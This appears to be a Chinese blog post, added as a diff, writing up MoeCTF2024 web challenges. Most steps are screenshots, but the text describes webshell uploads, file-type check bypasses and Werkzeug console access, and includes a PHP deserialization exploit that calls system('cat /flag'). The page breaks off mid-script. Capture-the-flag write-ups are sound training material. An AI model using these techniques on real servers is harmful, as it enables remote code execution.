@@ -1,0 +1,790 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="WebWeb渗透测试与审计入门指北phpstudy本地搭一个环境运行即可 弗拉格之地的入口robots.txt 1234# Robots.txt file for xdsec.org# only robots can find the entrance of web-tutorUser-agent: *Disallow: &#x2F;webtutorEntry.php flag在&#x2F;webtutor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF2024">
+<meta property="og:url" content="http://example.com/2024/08/24/MoeCTF2024/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="WebWeb渗透测试与审计入门指北phpstudy本地搭一个环境运行即可 弗拉格之地的入口robots.txt 1234# Robots.txt file for xdsec.org# only robots can find the entrance of web-tutorUser-agent: *Disallow: &#x2F;webtutorEntry.php flag在&#x2F;webtutor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/9B6FCBC1760D4e7990CF7F70623A006D.png">
+<meta property="og:image" content="http://example.com/images/C77213F444144c55A8563E4596E037A8.png">
+<meta property="og:image" content="http://example.com/images/0670BF3982BC40e98254B2759B086044.png">
+<meta property="og:image" content="http://example.com/images/C693842AAD3F4464A2417DE6FFE2809A.png">
+<meta property="og:image" content="http://example.com/images/3CF361A1C8CE4994BDEEF35DEBC7DCD9.png">
+<meta property="og:image" content="http://example.com/images/C6129D055D2D4c7a9480817045871213.png">
+<meta property="og:image" content="http://example.com/images/D3E3FA759BB04fec92DE830C60CFAC41.png">
+<meta property="og:image" content="http://example.com/images/AA0C84F37CE9457580549394D3339DF6.png">
+<meta property="og:image" content="http://example.com/images/2EDE53EC5C0143fc92C0CB317AF84AEC.png">
+<meta property="og:image" content="http://example.com/images/FF9DA8DA8D7A44d69D8C85E8CE45D9BE.png">
+<meta property="og:image" content="http://example.com/images/980B98B25D6E4971B78F42614E30E886.png">
+<meta property="og:image" content="http://example.com/images/1C9DA35908E948f3B52C7B7D1CD47C5C.png">
+<meta property="og:image" content="http://example.com/images/D0913F2B1390451792BA097808E2DF02.png">
+<meta property="og:image" content="http://example.com/images/2DFAA68255FE49d2BB37C6479500FC16.png">
+<meta property="og:image" content="http://example.com/images/87883DF40E7D4ce2AC44ABA552177C37.png">
+<meta property="og:image" content="http://example.com/images/43B6097D161146598488ABEE7C5007EC.png">
+<meta property="og:image" content="http://example.com/images/97147CBE24594329AF7B-E5230FF92411.png">
+<meta property="og:image" content="http://example.com/images/807581E5AB7E493d863145A55C035364.png">
+<meta property="og:image" content="http://example.com/images/C548D11017684ea19358053AE1D27724.png">
+<meta property="og:image" content="http://example.com/images/E4D628F47B0746f8A33EA28A5B4E41C5.png">
+<meta property="og:image" content="http://example.com/images/87D69C227E7D401c91396D0920D92184.png">
+<meta property="og:image" content="http://example.com/images/6E4C0BDE7416417b9C6CF6EEC81C2041.png">
+<meta property="og:image" content="http://example.com/images/29AD5531EE51424c96B6C4ED066768DA.png">
+<meta property="og:image" content="http://example.com/images/597FD934521F4c5e8F5C80CA4AADC9FB.png">
+<meta property="og:image" content="http://example.com/images/8F105B596C7544e58B0146CE6DE2D587.png">
+<meta property="og:image" content="http://example.com/images/89CE3D753D154e83931B21372005A7F6.png">
+<meta property="og:image" content="http://example.com/images/0907CE4A836C46ffB60EAAF1CF134B15.png">
+<meta property="og:image" content="http://example.com/images/395C504A4F39451c92DA9DBB24A305A5.png">
+<meta property="og:image" content="http://example.com/images/9ABA1C191EF54d0dB26FF457E3BA5328.png">
+<meta property="og:image" content="http://example.com/images/D315171C3FE04f849B158669668D449A.png">
+<meta property="article:published_time" content="2024-08-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-08T14:16:10.506Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/9B6FCBC1760D4e7990CF7F70623A006D.png">
+  
+  
+  
+  <title>MoeCTF2024 - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MoeCTF2024"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-24 00:00" pubdate>
+          2024年8月24日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          88 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MoeCTF2024</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h2><p>phpstudy本地搭一个环境运行即可</p>
+<h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h2><p>robots.txt</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># Robots.txt file for xdsec.org</span><br><span class="hljs-comment"># only robots can find the entrance of web-tutor</span><br><span class="hljs-section">User-agent: *</span><br><span class="hljs-section">Disallow: /webtutorEntry.php</span><br></code></pre></td></tr></table></figure>
+<p>flag在&#x2F;webtutorEntry.php</p>
+<p><img src="/images/9B6FCBC1760D4e7990CF7F70623A006D.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p><img src="/images/C77213F444144c55A8563E4596E037A8.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h2><p><img src="/images/0670BF3982BC40e98254B2759B086044.png" srcset="/img/loading.gif" lazyload><br>前端不许重复提交，抓包这个页面重复提交<br>300份可以爆破<br><img src="/images/C693842AAD3F4464A2417DE6FFE2809A.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h2><p><img src="/images/3CF361A1C8CE4994BDEEF35DEBC7DCD9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/C6129D055D2D4c7a9480817045871213.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/D3E3FA759BB04fec92DE830C60CFAC41.png" srcset="/img/loading.gif" lazyload></p>
+<p>改前端<br><img src="/images/AA0C84F37CE9457580549394D3339DF6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/2EDE53EC5C0143fc92C0CB317AF84AEC.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/FF9DA8DA8D7A44d69D8C85E8CE45D9BE.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/980B98B25D6E4971B78F42614E30E886.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h2><p><img src="/images/1C9DA35908E948f3B52C7B7D1CD47C5C.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h2><p>一句话木马<br><img src="/images/D0913F2B1390451792BA097808E2DF02.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h2><p>前端验证<br>上传2.png，抓包后改为php即可</p>
+<h2 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="headerlink" title="垫刀之路04: 一个文件浏览器"></a>垫刀之路04: 一个文件浏览器</h2><p><img src="/images/2DFAA68255FE49d2BB37C6479500FC16.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h2><p><img src="/images/87883DF40E7D4ce2AC44ABA552177C37.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable language_">$this</span>-&gt;evil);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br><br><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br> &#123;<br>     <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>反序列化入门了哈，这对我反序列化的短板改变会很大 加油！！！！！！！！！！</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span> =<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable language_">$this</span>-&gt;evil);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setevil</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$d</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">setevil</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="垫刀之路07-泄漏的密码"><a href="#垫刀之路07-泄漏的密码" class="headerlink" title="垫刀之路07: 泄漏的密码"></a>垫刀之路07: 泄漏的密码</h2><p>扫到console<br>输入pin码<br>发现可以执行python命令</p>
+<p><img src="/images/43B6097D161146598488ABEE7C5007EC.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h2><p>点击二次元便装<br>抓取到这个页面<br><img src="/images/97147CBE24594329AF7B-E5230FF92411.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/807581E5AB7E493d863145A55C035364.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="电院-Backend"><a href="#电院-Backend" class="headerlink" title="电院_Backend"></a>电院_Backend</h2><p>根据附件给的代码构造语句<br><img src="/images/C548D11017684ea19358053AE1D27724.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/E4D628F47B0746f8A33EA28A5B4E41C5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a>勇闯铜人阵</h2><p><img src="/images/87D69C227E7D401c91396D0920D92184.png" srcset="/img/loading.gif" lazyload><br>好久没写脚本了，先拉坨屎山</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import re<br><br>a =requests.session()<br><br>url = <span class="hljs-string">&#x27;http://127.0.0.1:57542/restart?&#x27;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;player&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;direct&quot;</span>:<span class="hljs-string">&#x27;弟子明白&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">while</span> 1:<br>    <span class="hljs-attribute">b</span>=a.post(url=url,data=data)<br>    tex = re.findall(r<span class="hljs-string">&#x27;&lt;h1 id=&quot;status&quot;&gt;\s*(.*?)\s*&lt;/h1&gt;&#x27;</span>, b.text)<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;text=&#x27;</span>,b.text)<br>    <span class="hljs-built_in">print</span>(tex)<br>    <span class="hljs-attribute">str1</span>=str(tex)<br>    str1 = str1.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;str1=&#x27;</span>,str1)<br>    mark = 0<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">j</span>==&#x27;,&#x27;:<br>            <span class="hljs-attribute">mark</span>=1  #两个<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;moectf&#x27;</span> <span class="hljs-keyword">in</span> b.text:<br>        <span class="hljs-built_in">print</span>(b.text)<br>        break<br>    <span class="hljs-keyword">if</span> mark ==0:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;嗨嗨嗨&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">str1</span>==&#x27;1&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>]=<span class="hljs-string">&quot;北方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;2&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东北方&quot;</span><br>        elif str1 == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;4&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东南方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;5&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;南方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;6&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西南方&quot;</span><br>        elif str1 == <span class="hljs-string">&#x27;7&#x27;</span>:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;8&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西北方&quot;</span><br>    elif <span class="hljs-attribute">mark</span>==1:<br>        mark1 = 0  # 判断逗号<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;嘻嘻嘻&#x27;</span>)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> str1:<br>            <span class="hljs-built_in">print</span>(k)<br>            <span class="hljs-keyword">if</span> <span class="hljs-attribute">k</span>==&#x27;1&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;北方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;1&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;北方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;2&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东北方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;2&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;东北方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;3&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;3&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;东方一个&quot;</span><br>            elif <span 